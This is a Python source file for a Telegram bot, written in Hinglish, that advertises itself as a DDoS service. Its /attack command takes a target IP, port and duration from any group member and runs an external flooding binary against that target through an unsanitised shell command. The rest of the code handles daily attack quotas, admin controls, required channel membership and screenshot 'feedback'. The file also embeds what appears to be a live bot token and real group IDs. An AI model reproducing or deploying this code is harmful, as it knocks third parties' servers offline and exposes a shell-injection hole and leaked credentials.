#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import aiohttp
import threading
import random
# Insert your Telegram bot token here
bot = telebot.TeleBot('7341253884:AAE8um0obaD8s69vM6vsVak6TJjolsOljCY')


# Admin user IDs
admin_id = ["7357694692"]

# Group and channel details
GROUP_ID = "-1002286236671"
CHANNEL_USERNAME = "@LOSTVIPDDOS76"

# Default cooldown and attack limits
COOLDOWN_TIME = 0  # Cooldown in seconds
ATTACK_LIMIT = 10  # Max attacks per day
global_pending_attack = None
global_last_attack_time = None
pending_feedback = {}  # यूजर 

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}
global_last_attack_time = None  # Global cooldown tracker

# 🎯 Random Image URLs  
image_urls = [
    "https://envs.sh/g7a.jpg",
    "https://envs.sh/g7O.jpg",
    "https://envs.sh/g7_.jpg",
    "https://envs.sh/gHR.jpg",
    "https://envs.sh/gH4.jpg",
    "https://envs.sh/gHU.jpg",
    "https://envs.sh/gHl.jpg",
    "https://envs.sh/gH1.jpg",
    "https://envs.sh/gHk.jpg",
    "https://envs.sh/68x.jpg",
    "https://envs.sh/67E.jpg",
    "https://envs.sh/67Q.jpg",
    "https://envs.sh/686.jpg",
    "https://envs.sh/68V.jpg",
    "https://envs.sh/68-.jpg",
    "https://envs.sh/Vwn.jpg",
    "https://envs.sh/Vwe.jpg",
    "https://envs.sh/VwZ.jpg",
    "https://envs.sh/VwG.jpg",
    "https://envs.sh/VwK.jpg",
    "https://envs.sh/VwA.jpg",
    "https://envs.sh/Vw_.jpg",
    "https://envs.sh/Vwc.jpg"
]

def is_user_in_channel(user_id):
    return True  # **यहीं पर Telegram API से चेक कर सकते हो**
# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

# Function to save user data to the file
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

# Middleware to ensure users are joined to the channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global global_last_attack_time

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, f"🚫 YE BOT SIRF GROUP ME CHALEGA ❌\n🔗 JOIN NOW: {CHANNEL_USERNAME}")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **PAHLE JOIN KRO** {CHANNEL_USERNAME} 🔥")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 **SCREENSHOT DE PEHLE!** 🔥\n🚀 *AGAL ATTACK LGANE KE LIE SABIT KOR KI PIC DAL!*")
        return

    # Check if an attack is already running
    if is_attack_running(user_id):
        bot.reply_to(message, "⚠️ **RUK BE BHAI EK ATTACK CHAL RHA HAI!** ⚡")
        return

    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}

    user = user_data[user_id]
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, f"❌ **ATTACK LIMIT OVER!** ❌\n🔄 *TRY AGAIN TOMORROW!*")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /attack <IP> <PORT> <TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **ERROR:** 𝐏𝐎𝐑𝐓 𝐀𝐍𝐃 𝐓𝐈𝐌𝐄 𝐌𝐔𝐒𝐓 𝐁𝐄 𝐈𝐍𝐓𝐄𝐆𝐄𝐑𝐒!")
        return

    if time_duration > 180:
        bot.reply_to(message, "🚫 **MAX DURATION = 180𝐬!**")
        return

    # Get the user's profile picture
    profile_photos = bot.get_user_profile_photos(user_id)
    if profile_photos.total_count > 0:
        profile_pic = profile_photos.photos[0][-1].file_id
    else:
        # Ask the user to set a profile picture
        bot.reply_to(message, "❌ **CHUTIYA BHAI AH OH PROFILE PIC DALINE!** 🔥\n📸 *CHUTIYA SET A PROFILE PIC TO ATTACK!*")
        return

    remaining_attacks = ATTACK_LIMIT - user['attacks'] - 1
    random_image = random.choice(image_urls)

    # Send profile picture and attack start message together
    bot.send_photo(message.chat.id, profile_pic, caption=f"👤 **User:** @{user_name} 🚀\n"
                                                        f"💥 **ATTACK STARTED!** 💥\n"
                                                        f"🎯 **TARGET:** `{target} : {port}`\n"
                                                        f"⏳ **DURATION:** {time_duration}𝙨\n"
                                                        f"⚡ **REMAINING ATTACKS:** {remaining_attacks}\n"
                                                        f"📸 **GAME KA FEEDBACK BHEJ DE!**\n"
                                                        f"⏳ **PROGRESS: 0%**")

    pending_feedback[user_id] = True  

    full_command = f"./LOSTPAPA {target} {port} {time_duration} 1200"

    try:
        subprocess.run(full_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ **𝐄𝐑𝐑𝐎𝐑:** {e}")
        pending_feedback[user_id] = False
        return

    # Update progress bar to 100% and close pop-up
    bot.send_message(message.chat.id, 
                     f"✅ **ATTACK COMPLETE!** ✅\n"
                     f"🎯 `{target}:{port}` **DESTROYED!**\n"
                     f"⏳ **DURATION:** {time_duration}𝙨\n"
                     f"⚡ **REMAINING ATTACKS:** {remaining_attacks}\n"
                     f"⏳ **PROGRESS: 100%**")

    threading.Thread(target=send_attack_finished, args=(message, user_name, target, port, time_duration, remaining_attacks)).start()


def is_attack_running(user_id):
    """
    Checks if the user is currently running an attack.
    """
    return user_id in pending_feedback and pending_feedback[user_id] == True


def send_attack_finished(message, user_name, target, port, time_duration, remaining_attacks):
    bot.send_message(message.chat.id, 
                     f"🚀 **BHAI NEXT ATTACK READY!** ⚡")
    
    bot.send_message(message.chat.id, "🚀 **DALO NEXT ATTACK READY!** ⚡")
    
@bot.message_handler(commands=['check_cooldown'])
def check_cooldown(message):
    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
        bot.reply_to(message, f"Global cooldown: {remaining_time} seconds remaining.")
    else:
        bot.reply_to(message, "No global cooldown. You can initiate an attack.")

# Command to check remaining attacks for a user
@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in user_data:
        bot.reply_to(message, f"You have {ATTACK_LIMIT} attacks remaining for today.")
    else:
        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
        bot.reply_to(message, f"You have {remaining_attacks} attacks remaining for today.")

# Admin commands
@bot.message_handler(commands=['reset'])
def reset_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /reset <user_id>")
        return

    user_id = command[1]
    if user_id in user_data:
        user_data[user_id]['attacks'] = 0
        save_users()
        bot.reply_to(message, f"Attack limit for user {user_id} has been reset.")
    else:
        bot.reply_to(message, f"No data found for user {user_id}.")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /setcooldown <seconds>")
        return

    global COOLDOWN_TIME
    try:
        COOLDOWN_TIME = int(command[1])
        bot.reply_to(message, f"Cooldown time has been set to {COOLDOWN_TIME} seconds.")
    except ValueError:
        bot.reply_to(message, "Please provide a valid number of seconds.")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    user_list = "\n".join([f"User ID: {user_id}, Attacks Used: {data['attacks']}, Remaining: {ATTACK_LIMIT - data['attacks']}" 
                           for user_id, data in user_data.items()])
    bot.reply_to(message, f"User Summary:\n\n{user_list}")
    

# Dictionary to store feedback counts per user
feedback_count_dict = {}

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    feedback_count = feedback_count_dict.get(user_id, 0) + 1  # Increment feedback count for the user

    # Update feedback count in the dictionary
    feedback_count_dict[user_id] = feedback_count

    # 🚀 Check if user is in channel  
    try:
        user_status = bot.get_chat_member(CHANNEL_USERNAME, user_id).status
        if user_status not in ['member', 'administrator', 'creator']:
            bot.reply_to(message, f"❌ **YOU MUST JOIN OUR CHANNEL FIRST!**\n"
                                  f"🔗 **JOIN HERE:** [Click Here](https://t.me/{CHANNEL_USERNAME})")
            return  
    except Exception as e:
        bot.reply_to(message, "❌ **COULD NOT VERIFY MAKE SURE THE BOT LS ADMIN IN CHANNEL.**")
        return  

    # ✅ Proceed If User is in Channel
    if pending_feedback.get(user_id, False):
        pending_feedback[user_id] = False  

        # 🚀 Forward Screenshot to Channel  
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)

        # 🔥 Send Confirmation with SS Number  
        bot.send_message(CHANNEL_USERNAME, 
                         f"📸 **BHAI FEEDBACK RECEIVED!**\n"
                         f"👤 **USER:** `{user_name}`\n"
                         f"🆔 **ID:** `{user_id}`\n"
                         f"🔢 **SS NO.:** `{feedback_count}`")

        bot.reply_to(message, "✅ **FEEDBACK ACCEPTED BHAI NEXT ATTACK READY!** 🚀")
    else:
        bot.reply_to(message, "❌ **THIS IS NOT A VALID RESPONSE!**")
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""🌟🔥 WELCOME BRO {user_name} 🔥🌟
    
🚀 **YOU RE IN THE HOME OF POWER! 💥 THE WORLD'S BEST DDOS BOT 🔥
 ⚡ BE THE KING DOMINATE THE WEB!  

🔗 **TO USE THIS BOT JOIN NOW:**  
👉 [GROUP LINK](https://t.me/+xsi7410YP0c3ZTc1) 🚀🔥"""
    
    bot.reply_to(message, response, parse_mode="Markdown")
# Function to reset daily limits automatically
def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

# Start auto-reset in a separate thread
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Load user data on startup
load_users()


#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(15)
        
        
 




